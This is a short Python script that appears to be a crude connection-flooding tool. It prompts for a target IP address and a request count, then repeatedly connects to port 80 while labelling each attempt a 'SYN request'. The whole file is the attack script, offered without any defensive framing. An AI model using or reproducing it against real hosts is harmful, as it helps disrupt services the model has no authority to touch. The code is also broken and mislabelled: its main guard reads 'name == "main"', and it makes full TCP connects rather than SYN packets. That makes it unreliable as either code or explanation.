import socket

def tcpsyn(target_ip, target_port, num_requests):
    try:
        target_ip = socket.gethostbyname(target_ip)
    except socket.gaierror:
        print("Invalid IP address")
        return

    for _ in range(num_requests):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, target_port))
            print(f"Sending SYN request to {target_ip}:{target_port}")
            s.close()
        except (socket.error, socket.timeout):
            print(f"Failed to send SYN request to {target_ip}:{target_port}")

if name == "main":
    target_ip = input("Enter the target IP address: ")
    target_port = 80
    num_requests = int(input("Enter the number of requests: "))
    
    tcpsyn(target_ip, target_port, num_requests)
